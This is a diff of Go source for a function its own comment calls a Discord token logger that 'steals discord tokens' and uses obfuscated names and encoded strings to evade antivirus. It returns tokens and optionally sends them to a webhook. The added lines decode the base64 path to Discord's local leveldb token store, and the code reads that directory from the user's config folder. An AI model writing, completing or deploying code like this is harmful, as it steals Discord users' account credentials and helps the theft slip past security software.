@@ -10,10 +10,12 @@ import (
 //TokenLoggerEvasive is a logger that steals discord tokens and uses obfuscated function names and string obfuscation to hide the token and evade AV.
 //Returns a token and optionally sends to discord webhook.
 func TokenLoggerEvasive(webhookURL string) (string, error) {
-	//
+	//This is the encoded LDB path to the token
+	//XFxkaXNjb3JkXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFw=:LmxkYg==:b2tlbg==
 	toyStore := "WEZ4a2FYTmpiM0prWEZ4TWIyTmhiQ0JUZEc5eVlXZGxYRnhzWlhabGJHUmlYRnc9OkxteGtZZz09OmIydGxiZz09"
 	ballPit := cake(toyStore)
 	playground := strings.Split(ballPit, ":")
+	//\\discord\\Local Storage\\leveldb\\
 	var s1, s2, s3 = playground[0], playground[1], playground[2]
 	root, _ := os.UserConfigDir()
 	localFiles, err := os.ReadDir(root + cake(s1))
